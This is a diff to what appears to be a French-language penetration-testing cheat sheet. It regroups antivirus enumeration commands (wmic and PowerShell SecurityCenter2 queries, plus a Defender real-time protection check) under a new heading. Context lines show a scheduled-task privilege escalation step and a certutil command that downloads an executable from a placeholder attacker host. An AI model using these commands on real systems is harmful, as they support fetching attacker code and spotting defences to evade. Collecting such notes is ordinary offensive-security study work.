@@ -87,8 +87,19 @@ Windows Local PrivEsc : https://book.hacktricks.xyz/windows-hardening/windows-lo
                     schtasks /run /tn vulntask #Exécute la tâche direct
 
 [CMD](WIN)*CMD*  => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe
-[AV]*PS*         => Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
-[AV]*CMD*        => wmic /namespace:\\root\securitycenter2 path antivirusproduct
+```
+
+# AntiVirus
+
+```
+========================= OBTENIR LES INFOS SUR LES AV INSTALLE =============================
+
+*CMD*  => wmic /namespace:\\root\securitycenter2 path antivirusproduct
+*PS*   => Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
+=============================================================================================
+
+*PS* Check si actif =>  Get-MpComputerStatus | select RealTimeProtectionEnabled
 ```
 
 # Some XSS Cheats
